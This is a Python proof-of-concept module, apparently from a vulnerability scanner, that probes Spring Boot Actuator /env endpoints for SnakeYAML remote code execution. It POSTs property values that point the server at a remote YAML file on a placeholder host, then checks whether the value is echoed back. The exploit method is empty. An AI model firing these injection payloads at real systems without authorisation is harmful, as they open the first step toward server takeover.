# coding:utf-8

import requests
from util import RandomUA
from util.Translate import tr

class SnakeYAML_RCE:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()
        self.Headers_1 = {
        "User-Agent": self.ua,
        "Content-Type": "application/x-www-form-urlencoded"
        }
        self.Headers_2 = {
        "User-Agent": self.ua,
        "Content-Type": "application/json"
        }
        self.payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
        self.payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
        self.path = 'env'
    def poc(self,url,proxies,ProxyStute):
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            requests.packages.urllib3.disable_warnings()
            urltest = url + self.path

            re1 = requests.post(url=urltest, headers=self.Headers_1, data=self.payload_1, timeout=6, allow_redirects=False,
                            verify=False, proxies=proxies)
            re2 = requests.post(url=urltest, headers=self.Headers_2, data=self.payload_2, timeout=6, allow_redirects=False,
                            verify=False, proxies=proxies)

            if ('example.yml' in str(re1.text)):
                result1 = tr("v.snake.found1")
                result2 = tr("v.snake.path", url=urltest)
                result3 = tr("v.snake.post", payload=self.payload_1)
                return result1 + result2 + result3
            elif ('example.yml' in str(re2.text)):
                result1 = tr("v.snake.found2")
                result2 = tr("v.snake.path", url=urltest)
                result3 = tr("v.snake.post", payload=self.payload_2)
                return result1 + result2 + result3
            else:
                result = tr("v.snake.none", url=urltest)
                return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    def exp(self,url,proxies,ProxyStute,cmd):
        pass